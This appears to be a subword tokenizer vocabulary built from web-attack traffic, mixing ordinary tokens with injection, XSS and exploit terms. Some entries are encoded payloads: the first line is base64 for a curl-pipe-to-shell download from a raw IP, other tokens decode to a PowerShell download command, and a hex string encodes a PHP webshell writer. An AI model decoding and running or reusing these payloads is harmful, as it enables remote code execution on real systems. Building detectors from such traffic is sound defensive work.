Y3VybCAtZnNTTCBodHRwOi8vNjEuOTcuMTg4LjQyOjgwODAvbHIuc2ggfHNo
cles6lp16vcb9m6adkl
09
176
174
167
1999
2s
2663
300
330
361
368
3760
400
430
410
418
530
544
592
639
631
736
799
7706
7629
872
851
9332
AU
BW
BA
BBS
BeN
Cx
CSS
CLA
DY
Ea
Fl
Fv
FZ
FD
FHa
FaUUJ
FHNEFiQUJ
FvQUNjQWFBQjBBSFFBY
FFNEFaUUIzQUMwQVR
Gz
Gpon
Iu
IMA
I20
LI
LB
La
Log
MT
OP
Ph
Ps
Pr
Port
QC
QmlBR
QjBBR
QmxBR
QVZ
Rj
System
TAB
Ub
Upgrade
VF
VBYlFBdUFFNEFaUUIwQUM
Word
YQ
ZW
Zo
ZH
ZXJ
aJ
ahc
bh
c9
cw
cite
click
dbo
dCc
el
emp
fh
fes
gd
gV
gui
hr
has
hink
ign
jx
jscript
jqu
jIFNRQkZBRmdBSUFBb
kq
load
lBWXdCc
mce
most
np
ok
origin
pc
pur
rh
rU
rel
sr
sG
size
tY
tas
tiki
wb
wr
wbr
xY
xA
x68
yell
ëª
##4Gd
##Fh
##Fd
##FN
##SZ
##Size
##Yo
##YE
##If
##BI
##BB
##Bk
##Bo
##MFG
##ix
##iKO
##nel
##nou
##5A
##lE
##lc
##Press
##X55
##wg
##wG
##3B
##8g
##8JD
##WV
##6p
##6lt
##he
##hRQUtRQXVBRVFBYndCM
##jw
##jk
##jr
##jN
##a9
##ak
##ae
##aU
##uq
##uh
##uV
##uPS
##uration
##krh
##fp
##fic
##sk
##sr
##sc
##0i
##0e
##0126
##g9
##gge
##ero
##eactivate
##zt
##yC
##ybox
##1s
##1q7
##200
##pP
##pr
##pdf
##pper
##xq
##xL
##oS
##oi
##vuu
##Kh
##Kz
##bY
##bj
##bas
##bdC
##Zo
##ZN
##Header
##rony
##RK
##RvY
##QP
##QW
##QD
##mW
##mj
##mU
##mA
##mO
##Ap
##AO
##Date
##E9
##EL
##End
##Event
##cm
##cer
##NH
##NQ
##Nvb
##CP
##CAL
##Col
##Ok
##Oo
##OD
##OV
##Gq
##VU
##VJ
##JE
##©ë
##ong
##onth
##tionTp
Insecu
##rtou
1151
1168
inject
##waHA
instNo
##test
1062
1054
##0064
##0016
ipv
8080
##30vuu
##avml
##econ
ascript
9844
##orp
##orrent
497
##deg
##mpa
##men
sysdata
4893
##estionTp
##11XA
##lish
5038
Report
##702
##652
##722091
5207
##408
searchword
searchWr
8863
##omCd
5573
ids
##14ESERVER
7532
7526
HTTPS
##749
156
1522
##941
223
226
220
6894
6666
8488
##ots
2453
24X55
7032
##LOAD
##5430vuu
8798
143
##lag
ma5430vuu
filepath
2933
media
than
6488
##amil
7163
getClass
791
##IVATION
annou
##iron
logon
exe
exploit
export
219
##ocument
2e2e
9221
9470
##check
strtou
6179
left
result
##okkrh
colgroup
##ig08p
onloadstart
##Noby
Requests
9660
2533
Form
ondeactivate
questionTp
qjb
##ChMa
1359
standard
intro
gzip0000
FILES
##pose
6110
acrony
pl1
preview
prepend
environ
rotate
configuration
1689
front
sudo
sugge
blbdC
manage
LOCAL
option2
ontransitionrun
Therefore
##ports
##FileId
##Iuc2ggfHN
QUdFQVpBQlRBSFFBY
QUhRQUtRQXVBRVFBYndCM
brd
indication
classLoad
##Search
##Property
articlepdf
Account2
5008
ACTIVATION
1401
9306
Search
##zaGVsbCAtZW
2908
arm7
20140924091920064
busybox
##5sec
##11111111111
180deg
visitor
4764
7102
HEAD
height
naver
##wpKi
##vr6lt
themes
u003Ealert
##Ye4Gd
Setting
##2J11XA
cG93ZXJlYX
formaction
##gnition
ONLOAD
icons
nonce
##wLjE
wordpress
##HttpRequest
2KYe4Gd
300017EREMOTE
xyz
##Manager
substr
Hija
typic
##5p49
##jm8okkrh
portal
behavior
BWlFCakFIUUFJQUJUQUhrQWN
BeNChMa
GponForm
IMAGE
I20200
TABLE
WordPress
ZXJzaGVsbCAtZW
ahcfree
cwbi
dCcEFHNEFad
gdviewer
ignored
jquery
purpose
x6858726b
yellavml
ëª©ë
##MFG8JD
##0126HUser
##1q7MFG8JD
##bases
Insecure
sysdatabases
##72209154
searchWrd
ma5430vuuvr6lt
##amily
announce
strtoupper
suggest
blbdComCd
classLoader
##wpKi2J11XA
2KYe4GdwpKi2J11XA
##jm8okkrh5p49
BeNChMaRK
I2020072209154
yellavmlap
##1q7MFG8JDP
ma5430vuuvr6ltjm8okkrh5p49
2KYe4GdwpKi2J11XA1q7MFG8JDP
012
015
0px
195
1626
1787
2617
2787
2641
331
376
395
3658
442
478
4409
4337
4741
533
595
579
5721
5395
5747
695
675
6421
6651
6108
776
772
876
8677
975
9648
9626
Alive
Ajx
Blind
CE
DI
ERE
EMB
Gy
Go
GK
HD
Header
Jzd
LP
Lf
Lz
LE
LFI
LAY
Mq
Mu
MZ
NM
Nn
Ne
Np
Net
PC
PAT
Rp
SI
STR
Tj
USE
Ve
VA
WY
Xv
XWeb
Yf
Yr
YD
YG
Zp
Zd
aM
accept
bm
bJ
bes
bdi
blogs
cI
c0
cp
cc
cal
dw
da
dup
dash
fusion
gk
gE
gG
gub
gallery
hash
hgroup
iF
iden
jcy
kI
kbd
la
lo
lH
lab
mz
mc
msg
nl
nX
nH
nA
ow
oy
oH
owa
oxy
rs
sf
ss
sH
sch
sup
sports
tp
tK
tName
vS
vm
vNTkuNy
wL
wso
xn
x8
xT
xc
xpe
x20
yM
yMTcuMjQzOjcwNzAvZG
zP
zW
zC
zhttp
##Fk
##Flag
##SY
##Sg
##SU
##SL
##Service
##YH
##IY
##Iv
##IHR
##INDEX
##Bz
##Bx
##BU
##Bd
##BNEF
##Mf
##MH
##MD5
##ik
##iD
##nq
##nc
##nC
##nG
##nIuc
##nQUxnQ
##tY
##tP
##tL
##tel
##9f
##qn
##qy
##lI
##lK
##lare
##PU
##Pr
##PUUF
##PUT
##wb
##wec
##3M
##WD
##6QUR
##hg
##hd
##her
##jv
##aS
##aa
##aW5
##aXB
##u4
##uH
##uE
##uT
##u00
##uZy
##uMjA
##k6
##fS
##fq
##sF
##sve
##0g
##0K
##gu
##glist
##ever
##e21
##zone
##yQ
##yJ
##ysta
##1p
##1b
##pM
##xc
##oK
##osh
##vie
##Kj
##Kf
##Ke
##KV
##bq
##bV
##base
##bull
##bnQ
##Uw
##Uo
##UV
##ZX
##ZA
##ZC
##Hg
##HZ
##HQ
##Hc
##rW
##RP
##RX
##RA
##QY
##mL
##mJ
##Aj
##Az
##Arr
##TF
##TB
##Tt
##cr
##cted
##d4
##d3
##dz
##day
##Next
##Oe
##OJ
##G9
##Gg
##GV
##Vj
##Vz
##VBT
##Jr
##JT
##tach
##onerror
##rix
Insta
Intel
##rther
111111
##ways
##techange
4577
1133
##roso
1267
1095
1059
ipth
##ark
0x52
chun
##mall
##ech
aside
988
9886
##alS
4990
4956
onread
sqli
##gen
##gend
##000000
##tyset
party
4088
4896
##log
##786f
##11311
seo
session
demo
##lity
##ance
##RID
5058
##reply
##650
209
2012
2060
2019
INPUT
5434
516
##gist
##283
7730
PHPMyAdmin
9048
7566
6535
6544
6580
7244
HTTP0016
154
reap
221
2270
6891
6694
181
1887
2414
8933
5810
5885
0x716a78
##rag
6751
9942
1473
1481
##Option
8276
8223
6912
made
mamb
file3
2975
digi
arglist
##ices
##icroso
1143
XMLHttpRequest
1106
1102
289
2811
being
##ategory
388
3261
##7764d4
2FAS
2000
exa
10026EREMOTE
functions
1215
9153
##NDIuMjA
noframes
cmds
6100
imageUp
legend
force
island
colle
3494
3415
database
3175
##String
##47786f
scnIuc
container
html5sec
2574
2569
9998
##19EREQUEST
setBe
always
3930
attacks
5372
typeArr
##hort
responseText
cateCode
##ool
2999999
##HR0c
26qu
addHeader
##olver
recovery
1904
2609
##XJs
acx
2515
##intosh
plus
keygen
##Resolver
redbull
subcate
7428
2122
useAt
##PageName
000010
1922
xxe
##fHNo
##RlZCB
##NyaXB
3993
0x77764d4
2447
blank
popups
option1
english
##767171
1719
1712
16900
##lyce
##ariable
mobile
movie
shell2
##XhBRE
##2dBNEF
##EQUFPUUF
matrix
9687
3373
##uY29
x0D
arm4
1998
800019EREQUEST
safe
install
1650
3440
5689
6184
9713
lua
##dential
crons
clear
##ndingzone
cateTp2
2391
4681
Macintosh
fopen
sbtest
##woJ
##electstart
##9090909090909090
00010
BCxP
create
credential
##AiIH
2960
3105
6124
canvas
minimal
dcgi
onselectstart
##00000002
peopleCd
further
rc1
##u003E
##expression
0x4743544d
CSCOE
slidein
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d
evil
ggfHNo
koswec
large
layout
mCvt
optgroup
##f7e21
0x3f7e21
cgt0r03uns2v9n2g08p0
cmmBbsList
editors
MediaID
CLASS
emptyset
guide
jscripts
mostlyce
related
task
##Collection
##JECT
1151446
acronym
typical
EMBED
Jzdh
LAYER
PATH
USERID
XWebPageName
beshort
landingzone
zhttpd
##nQUxnQXhBRE
##6QURnQUxnQXhBRE
##ystatechange
##VBT2dBNEF
11111111311
ipths
0x5247786f
onreadystatechange
mambots
##icrosoft
##NDIuMjAwLjE
setBean
26quot
##NyaXB0
0x77764d4f
movieCd
##EQUFPUUF3
credentials
##6QURnQUxnQXhBREVBT2dBNEF
##6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3
038
138
1384
1655
1381
1955
2B
2d
271
276
267
2610
2649
342
396
392
360
379
355
3112
3743
3679
433
436
414
4613
4111
4382
5983
6d
6684
739
770
7421
7620
865
8334
8362
8282
8387
9646
9409
9943
9364
9618
Aj
AH
AT
AG
API
BX
CD
Close
CUR
Click
Category
Dq
DW
Ds
Eb
Fj
FO
Fuz
Faca
Gs
HX
How
IL
Ir
IG
Image
Ignition
JV
JSESSIONID
KF
Kt
MD
NI
OB
On
Ow
OW
Oh
Op
Oc
Pi
Pg
PAGE
PUT
PHN
Prag
QZ
QH
QG
Rc
SF
Sn
Sd
SV
Solution
Tv
TZ
UI
Ue
UV
WX
Wf
YW
Yx
Za
Zf
ax
art
agent
bF
bt
bs
bpt
blind
cv
cm
cou
cws
cult
cript
could
d8
dh
dD
des
ea
eAD
ebook
equi
ff
fs
fp
fav
family
gr
gids
hi
iB
ii
iq
im
ite
jF
jJ
jpeg
kh
kv
kop
ktv
korean
lB
mX
mw
mJ
month
nS
ns
ne
nb
nmap
ov
old
pq
pj
pg
pp
qn
qv
sg
sal
sor
spa
service
tJ
uX
uu
uQ
wf
ws
wV
xB
x9
xN
x09
x49
xbit
yi
yE
yO
yG
zj
zv
zd
zero
##4z
##4Q
##4cc
##Fw
##FU
##FJ
##S9
##Sk
##Set
##Server
##Yn
##Yl
##Ys
##Yx
##YC
##IO
##IpO
##Bw
##MS
##iS
##iB
##ield
##nS
##nn
##nf
##ncoded
##to
##578
##9p
##9m8
##q5
##qU
##qD
##qg08p0
##l1
##PG
##wt
##wr
##wQU
##3g
##3vQ
##8x
##Wl
##WW
##Wf
##6g4
##6Ly
##hW
##hC
##hing
##jh
##jd
##jC
##jJ
##af
##a10
##audio
##uF
##uL
##kY
##kg
##ky
##km
##korea
##fT
##sD
##son
##0a
##0z
##gp
##ei
##ert
##evy
##yu
##yR
##yth
##y3vQ
##169
##2Vy
##2Lg
##pB
##pX
##pZ
##pG
##pvf
##xd
##xza
##opt
##vC
##vO
##v00
##KF
##Kn
##bM
##bP
##bW
##bK
##bA
##bc
##Ul
##UND
##LP
##L2N
##ZP
##ZZ
##Hf
##He
##Ho
##Hb
##Hr
##rZ
##rab
##Rn
##Rj
##RV
##Qk
##Qz
##mv
##mVy
##mk5
##AW
##AC
##Acce
##Dp
##DT
##DC
##Dec
##Er
##Element
##Ta
##T1
##TG
##TJ
##c8
##cA
##dw
##Ng
##Nv
##Cw
##CQ
##CJ
##Ow
##OZ
##GRO
##Vw
##Value
##Variable
##J2
##JL
##ì´
##cking
##riz
##NDGq
1170
##lemen
##lencoded
##tected
1135
##root
129
1218
1293
1283
poly
1039
1031
1092
1094
##ercheck
##3969
0x46
##LLO
cha
chlvb
8184
8148
##mat
##ecimal
charset
9839
9883
9881
9849
4965
4952
4903
##ERUF
onProperty
##qlv00
##00000
##7666
##6a694
403
4042
4046
##chrome
##chni
##42jL
##adecimal
##liv
##anyt
securityco
504
Rebi
##rection
##reel
Execute
##704
##7071
##ettufq
##727666
1184
2038
2011
2054
2023
2085
2089
5213
##wdC
##ulation
##cebbq
searchG
tests
5435
5145
5106
8859
5508
7779
9095
9025
9041
625
##itfor
##9242
6572
6508
602
6098
6069
159
152
1565
1528
##946
222
2269
2293
2256
2222
##mluZy
6837
6875
6855
6873
6803
6664
3EiKO
184
189
183
1860
1893
1873
1823
##lse
847
845
841
8432
8411
8416
8415
7819
today
toString
705
7010
7016
8938
589
5811
8585
##rachni
##LOPT
5638
5690
679
6739
6775
9961
REL
project
profile
property
8770
8751
1465
1464
shop
8231
8258
8222
8202
697
6972
##arset
##zing
may
7451
197
8635
8691
1107
coff
##session
284
288
2858
2843
0x717a786271
##589242
5775
##666
##6ccy
##6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878
3876
3893
3888
3882
7137
7144
7179
3276
3272
3292
3216
getDec
2009
##59NDGq
4435
4418
exclude
##keView
encoded
##ishing
217
##CHR
##00010
9552
searchCate
9151
9175
925
webp
webboard
parent
u006f
##ffcebbq
9476
9451
3017
##vert
1644
1661
3631
3661
##20EREQUEST
stream
##91111111111111
615
1371
##ally
1770
apparent
iso
##part
4735
4795
##ieSB
9694
##ubun
setopt
setAcce
##ressed
NoW
4137
3511
3570
3568
##nuffcebbq
##0F5
##0FCe
##0FwQU
##hosin
##horiz
5961
##boqo
##21HHost
catego
##15ESERVER
itwork
##kFERUF
##BQnl
mifs
##HRo
2429
Charset
##hua
1429
1423
##AAA
##nQo
1906
##fox
DATA
7375
cf578
NTT
3731
x3D
9355
9352
##QUM4Q
Safe
basedir
##dField
subject
##Content
without
2525
##BY0FCe
##CKGRO
attach
##cnRlZCB
1924
##vc3
##dGF
##lowercheck
##odHRwOi8vNTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scn
000000000
##IEph
##eRe
2445
blue
6352
##UUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3
##YXN
3543
obx
4129
place
##trols
2502
##fe9m8
indica
5620
7959
moor
2360
##pbnRl
##QQQ
1725
rpm
time2
##IHxza
6308
delay
2343
6713
8685
9783
9686
abc
##kkfe9m8
1786
3373969
9604
fwrite
##NVU
0x716a716271
4609
MakeView
cjnuffcebbq
##zhGQ
##GU9
7285
##0cmluZy
##rDpvf
reply
##111111111111
3710
3729
9951
2378
2283
7313
##WJBQnl
##b3f
##HYpc
0000114
0000116
multipart
4444
4443
5782
7606
9441
HELLO
myadmin
usr
##State
##vxq
141001
1330
3117
5715
9985
9988
##Lvh
##mTy3vQ
##BQzRBY0FCe
5991
hexadecimal
xl2
##HXzhGQ
compressed
0x71627a6a71
attemp
6909
8994
9556
My2Lg
servlets
urlencoded
##qr42jL
##eye
##raph
##14141414
5427
5113
6323
7CCHR
##Kd0FwQU
##Detail
##Jsqr42jL
validaudio
SessionId
4430020EREQUEST
exploitable
4357
analy
HelloThinkPHP21
patterns
assert
drivers
services
simulation
waitfor
wHeRe
##0aW9
0x7171767171
0x7178767a71
14856
##KTsKC
5cwindows
BACKGRO
LogService
Phishing
ZWNoby
##lcnQo
##E9PQ
##mpass
ReportServer
791589242
##Iuc2ggfHNodHRwOi8vNTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scn
Hijacking
I202007220915491111111111111
dashboard
gubn
##laredField
chunked
##alSolution
HTTP0016HConnection
0x716a787a71
##OptionalSolution
digital
example
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878
267d
CURLOPT
EbHY
Fuzzing
Facade
However
OBJECT
PAGEINDEX
Pragma
Solutions
culture
eADx
equiv
kopri
nmaplowercheck
pjpeg
x49727666
xbitmap
##4ccqlv00
##6g4rDpvf
##mk5reel
##VariableOptionalSolution
polyanyt
0x466a694
chlvbettufq
onPropertyChange
securitycompass
Rebinding
coffee
##6ccyJsqr42jL
getDeclaredField
##59NDGqHXzhGQ
setAccessible
##boqo4ccqlv00
categories
##kFERUFKd0FwQU
cf578boqo4ccqlv00
##QUM4QWJBQnl
##IEphcnRlZCB
indicating
337396942
MakeViewVariableOptionalSolution
cjnuffcebbqkkfe9m8
14100100000002
##mTy3vQ6g4rDpvf
##BQzRBY0FCekFERUFKd0FwQU
My2Lg6ccyJsqr42jL
BACKGROUND
nmaplowercheck1
polyanytsa
0x466a694d
chlvbettufqmk5reel
##59NDGqHXzhGQHYpc
cf578boqo4ccqlv00a10
##QUM4QWJBQnlBQzRBY0FCekFERUFKd0FwQU
##mTy3vQ6g4rDpvfLvh
My2Lg6ccyJsqr42jL59NDGqHXzhGQHYpc
##QUM4QWJBQnlBQzRBY0FCekFERUFKd0FwQUE9PQ
04
163
1624
1396
1387
2a
2b
274
298
263
2120
2379
2747
2669
3d
340
352
3999
3111
3383
3388
3360
3777
4f
461
464
474
416
4302
4379
4424
4706
4428
4621
5f
576
512
596
5386
5643
5407
6f
6e
6C
6370
6657
6402
6395
6123
6760
6641
769
7000
7705
7673
7385
7765
7b3f
839
833
840
8302
8421
8365
8337
8643
8653
8745
961
9003
9983
9395
9969
9669
9748
Al
Ay
Ax
Ar
AR
Bt
BP
Bf
Be
Bp
Bv
Bb
BU
Bas
Ci
Cu
Cf
CPS
Client
DF
Dj
Du
De
DK
Dr
DV
Doc
Download
Ew
Ey
Er
ESERVER
Fq
Fd
Flo
FOR
Fdg
Gu
GL
GN
GAL
HU
HC
Ii
Ig
Iy
IK
Im
IJ
Jl
Jm
JN
JaV
KQ
LM
Lt
LX
Ls
Ly
Lo
Lr
LN
LC
LIN
Map
Md5
NF
Ni
NX
Nb
Nav
NaN
OI
Oq
OD
Open
QW
Qa
Qc
QJ
Rn
Recon
So
Sc
Service
Select
TX
TW
Tz
TR
Uq
Ul
Ua
Uk
Uf
UIV
VY
Vo
Vv
VU
VZ
Vr
VJ
VasCript
Vwq
Value
WS
WP
WW
Wu
Wo
WIu
Wapp
WMS
XD
YB
YE
Zy
Zx
ZJ
ay
aV
age
amf
bn
bP
bW
bL
bT
bit
bak
cy
clo
cce
cmt
client
dS
df
dp
dZ
das
eg
eE
eO
euY
esy
fX
fy
fb
fO
fet
ful
flow
f0r
gn
gX
gD
gN
goto
green
graph
hf
hx
hR
iT
ill
iko
jM
je
jA
jD
jE
jd
jG
kl
ka
kc
kd
lj
l1
lm
lC
lliv
math
mmc
ni
nk
nT
nO
nG
nlp
oL
ori
oet
oce
pK
pR
pQ
ppp
pip
ql
qN
qV
qtp
rq
rd
rN
rad
row
rpt
sF
sx
sO
sV
stack
srt
sap
sid
sur
small
tB
tb
tc
tag
tib
uI
uv
uD
uN
uG
uti
u14
upgrade
vw
va
wl
wU
wm
wiki
xF
xt
x88
xrst
xA0
x2F
x6C
yY
yX
yU
yes
yuy
zS
zw
z0
zg
zU
zJ
zpx
¤ê
ë³
##Ft
##F9
##FP
##Fz
##Fo
##FDAT
##SP
##Stack
##YZ
##YW5
##IS
##Il
##Iw
##Ie
##IPT
##Image
##BC
##MI
##Mz
##Mx
##MR
##Mode
##i7
##iA
##iss
##ity
##nI
##nx
##nL
##nation
##ncate
##tt
##tr
##torrent
##536
##5qd
##5waHA
##9I
##9s
##9zZ
##qI
##qw
##qW
##qz
##qL
##qm
##qN
##lv
##link
##Pc
##Pre
##Pjw
##Xn
##X1
##X2
##XO
##XG
##wF
##w1
##wv
##wc
##3t
##3Z
##8p
##WI
##Wg
##WG
##6F
##6l
##hq
##hw
##hA
##hell
##jP
##jA
##jkH
##aT
##aC
##ale
##a68
##aform
##aHR0c
##uw
##ua
##uU
##kh
##ka
##kr
##kR
##kA
##kG
##kwL
##s8
##sA
##sC
##gB
##gw
##g8
##gQ
##gD
##gaw
##eA
##e43
##eans
##eCt
##zP
##zb
##z0i
##yh
##1d
##1Ni
##2Rl
##2RvY
##pdate
##x5
##xe
##xz
##xH
##xD
##xhua
##oF
##oj
##oser
##vu
##vm
##Ky
##KJ
##Key
##buns2
##UY
##UM
##Un
##UX
##L3
##LQ
##Ld
##Lick
##Zu
##Zv
##ZSB
##HI
##HW
##Hs
##Hz
##rg
##rT
##Rw
##RG
##Rta
##Ruf
##Rpb24
##Qm
##QXV
##mI
##mM
##mZ
##mr
##Al
##A6
##Aa
##Ag
##A2
##DX
##Dh
##Du
##Ds
##Dm
##Del
##DVV
##Document
##EA
##EN
##EV
##Ext
##Ejavascript
##Email
##Tu
##To
##TC
##cX
##c6
##cz
##cari
##corp
##dx
##dT
##dBd
##NM
##Na
##NK
##NN
##Num
##NUUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3
##Ci
##Cn
##CW
##Client
##OY
##OB
##Ot
##Gk
##Gs
##Gr
##GR
##VY
##V0
##JB
##Jj
##J1
##JQU
##ï¼
##timo
##eline
1176
1111
1193
##LERY
##rue
##ruit
##ruct
##rupdate
SESS
##les
##tep
##ART
4537
4542
4557
4501
##rorupdate
1296
1210
1250
1266
1287
possi
poli
##errorupdate
##iter
##iteration
doczo
0x5
0x6
0x27
##RONT
8098
8081
cht
##3514
CAT1
8164
8151
8128
##ece
async
ascari
9878
9861
9810
9866
9816
##ines
##input
##ershell
4937
4934
4978
4975
4979
4950
4958
4905
4913
##627
##devel
1225
onerrorupdate
oninput
##STIN
0x717862
1074
406
4064
4063
4013
480
4834
4838
4814
4866
4816
4856
4813
4848
##ches
##mob
##lows
##escript
##321
##785
##959
##lion
##any
502
5071
5076
5095
5073
5020
5088
Redi
Revers
##report
##6b7671
impossible1
##707
##701
convert
controls
##etc
1189
2036
2078
2095
2068
2075
2017
2088
2022
USERDB
520
5256
5283
fill
1122
searchYear
test2
549
5418
5454
5453
5167
5153
5147
##gion
889
8842
8875
8888
8825
8884
##omMo
##omviewer
5533
5528
5567
5583
5546
5584
5545
7799
7778
7741
adm
9071
9061
9096
##disc
6298
6297
6225
6246
6222
6209
##141
7542
7574
6576
6551
6566
6541
6504
6072
6061
6010
6019
1544
1579
1550
1505
1509
referer
redevel
2259
2253
2205
2225
2203
2202
6844
6816
6813
6822
6821
##unload
apps
##idx
1878
1874
1898
1869
1816
1883
848
8492
8474
8450
8493
8491
7889
2411
2461
2490
2483
2482
897
8918
8916
5865
5859
5853
5820
5884
858
8578
8507
8589
8503
8502
0x716a6b7671
##rack
5631
5642
5667
5677
5603
673
6700
9900
9944
9965
9918
9979
9919
##54785
prot
props
9751
9793
seleCt
1438
1474
1497
1419
box
book
boaform
ship
SCR0
826
8278
8228
6935
6944
mac
maction
mass
macc
styles
291
2911
2979
745
7495
7488
7482
1970
420
422
4230
4272
4259
4204
##TXdBd
8631
8668
1141
cop
2838
2818
2826
6471
6410
6497
64e43
##58169
##58a68
5739
5794
3895
3892
716
7140
7196
7175
7174
3262
3297
getElement
2005
50000000
7974
7910
7916
##d5f
##597
4437
4490
##TRA
execution
7676
7670
##93d3
##5cGU9
payloads
2178
1004
9530
9570
9560
9199
9157
4634
4692
userfile
u0064
u0075
u0054
##ellrip
9418
9497
START
3040
3019
1634
1632
1672
1664
2771
3633
##13QXV
truncate
##MBeans
less
length
348
3433
3497
3491
3482
##ill
##lpage
##ence
315
3171
3130
3170
3165
3155
31684
##RCR
##emark
scp
xss15
4796
4792
9678
9690
257
##82ul
##opment
##refs
setChar
4176
3532
3592
##num
##0FDNEF
##RFd
##acro
3962
##wwF
##siu
##22HHost
##hock
##ho2ulhs
5931
5914
##naiss
##NSF
##NSRC
##the
##ther
1358
star
##ById
##657374
##Idx
##IdCollection
3143
upper
when
ADw
1445
2996
2672
##jcml
8340
1427
hello
1907
menuId
cfx
cfm
acc
forms
categoryIn
1315
1319
##bly
21063
x3A
expr
20150
applications
close0126HUser
room
##mmy
redlion
5329
ctg
1685
1686
252F
##download
atxhua
##andata
useDel
some
##ysis
##ults
Shells
##Rlc
##vc2
0000039
0000083
define
metadata
3759
3753
3752
6358
construct
1711
9901
Comp
##4bWx
##imiter
onanimationiteration
1693
4124
play
##c2V0
##QURJQU
2504
2621
3287
7956
7128
mark
##knRf
##pdrow
##rEz
425254785
##Iiwi
Account1
1726
1722
delCode
hidRe
##gdmF
1309
2346
8429
8687
8683
8681
9685
##mctp
12345
1407
2782
9283
ci5qd
2358
9307
9305
kofic
##MDo
##awM
##ditor
2555
Location
Main
##BgJ
x3csvg
7283
9143
9526
##7Cg
##Ij48
##IjAiIH
collectionList
9999999999
2328
2583
3724
800020HAccept
9953
9950
freemark
websites
3447
5729
5722
6188
7321
8716
8710
9319
##zdmc
##2a72
##Lm9
##LmK
##LmNvb
visitkorea
executed
4767
4725
9102
9584
gener
ultima
ultimo
controller
8921
##3d3
##AAAAAAAA
3186
3181
4114
5356
5614
8281
qxvxq
xlink
##WFs
progra
##acterEn
customMBeans
cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBWXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNjQWFBQjBBSFFBY0FBNkFDOEFMd0F5
2408
MyAdmin
handling
handler
nexacro
saveid
##5zknRf
##raping
##DovL
##VBTXdBd
2925
3347
7335
7445
9378
morePage
xise
##Shell
##wymTy3vQ6g4rDpvfLvh
##JGNo
20558169
format
xssme2
filmsView
3336
3352
9122
accesskey
##BREVBTXdBd
##kt29
exploitation
3919
analysis
pattern
4757
FRAMESET
ZGrab
ZG5zknRf
##qaJ
169528
360021HHost
whatthe
1764
3303
3683
DYNSRC
RjIR
hasNext
##ZoomMo
HTTPS00
24X55K
qjbjq
5791
EREMOTE
Google
YDLI
dupa2
gkBH
identity
##IHR5cGU9
##MHC
##aScRiPt
##svegaw
##Keys
##replyidx
popupsIdCollection
1151446111111111111
##NDIuMjAwLjE1Ni
PHN2
favic
nsResolver
spacer
##l1kt29
##6Ly93d3
##ython
##vc3Zn
##IHxzaA
attempting
cjnuffcebbqkkfe9m8vg
My2Lg6ccyJsqr42jL59NDGqHXzhGQHYpcwymTy3vQ6g4rDpvfLvh
7b3f58a68
Basic
Dummy
DocZoomMo
Flood
GALLERY
JaVaScRiPt
LINK
NFRONT
Naver
Reconnaiss
Scraping
UIVY
ValueStack
Wapples
amfx
bittorrent
cmtreplyidx
dasandata
fullpage
f0rmat
mmca
nkrf
orient
oetlf
pipeline
radio
rptxr
tibmob
utility
x88javascript
xrstf
yuyan
¤ê°
SESSIONID
possibly
doczoomviewer
asyncfox
ascaris
0x7178627671
redevelopment
SCR0IPT
getElementById
userfiles
##13QXVBREVBTXdBd
truncated
setCharacterEn
##0FDNEFNUUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3
##ho2ulhsl1kt29
categoryInst
useDelimiter
Shellshock
##4bWxuc
##QURJQU13QXVBREVBTXdBd
ci5qdho2ulhsl1kt29
freemarker
cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBWXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNjQWFBQjBBSFFBY0FBNkFDOEFMd0F5QURJQU13QXVBREVBTXdBd
2055816928
ZG5zknRfSk
##svegawellrip
11514461111111111111
##NDIuMjAwLjE1Ni4z
##6Ly93d3cu
7b3f58a689f
DocZoomMobile
Reconnaissance
setCharacterEncoding
cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBWXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNjQWFBQjBBSFFBY0FBNkFDOEFMd0F5QURJQU13QXVBREVBTXdBd0FDNEFNUUF6QURnQUxnQXhBREVBT2dBNEFEQUFPUUF3
039
003
1370
1708
1613
1368
1983
1648
1769
1333
1954
1765
1947
238
277
269
273
2402
2111
2409
2705
2927
2388
2948
2381
2643
2387
2706
2645
2651
2597
336
377
373
305
3405
3656
3673
3385
3625
3969
3968
4d
438
465
479
469
473
463
4708
4617
4705
4342
4355
4640
4748
540
574
591
5421
5708
5405
5705
5763
5333
5655
5954
5641
5949
5951
5947
699
6000
6386
6120
6646
6655
6645
6947
6968
6283
7112
7120
7684
7365
7395
7641
7cb
7666
836
838
